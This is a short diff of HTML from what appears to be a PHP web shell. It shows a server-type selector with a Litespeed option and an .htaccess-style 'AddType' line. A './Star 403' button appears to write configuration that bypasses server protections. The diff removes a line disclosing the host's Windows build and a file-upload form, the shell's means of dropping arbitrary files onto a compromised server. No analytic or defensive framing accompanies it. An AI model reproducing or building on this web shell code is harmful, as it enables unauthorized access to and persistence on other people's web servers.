@@ -513,8 +513,7 @@ AddType application/octet-stream .php ">Litespeed</option>
                                                                                 </select>
                                                                                 <input style="color:red;background-color:#FFFF" name="conf" size="10" value="./Star 403" type="submit">
                                                                                 <br /><br />
-            </form><b><br><br>Windows NT DESKTOP-RN0CKEB 10.0 build 22631 (Windows 11) AMD64<br></b>
-            <form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>
+            </form>
             </td>
             </table>
 </body>
